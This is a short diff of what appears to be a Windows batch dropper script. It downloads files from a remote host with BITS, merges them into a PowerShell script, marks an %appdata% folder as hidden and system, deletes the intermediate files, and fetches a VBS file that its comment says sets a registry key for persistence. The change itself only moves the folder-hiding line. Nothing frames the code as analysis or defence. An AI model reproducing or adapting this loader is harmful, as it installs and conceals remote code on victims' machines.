@@ -27,11 +27,11 @@ timeout /t 5 /nobreak >nul
 powershell -c "Start-BitsTransfer https://%u%/First.txt '%a%'"
 powershell -c "Start-BitsTransfer %dynLink% '%b%'"
 
+attrib +s +h "%appdata%\paged"
+
 :: Combine all and save as PowerShell script
 powershell -c "(gc '%f%' -Raw) -replace '----',(gc '%a%' -Raw) -replace '====',(gc '%b%' -Raw) | sc '%c%'"
 del "%a%" "%b%" 2>nul
-
-attrib +s +h "%appdata%\paged"
 
 :: Download VBS and set registry key for persistence
 powershell -c "iwr https://%u%/S_m.vbs -OutFile '%v%'"
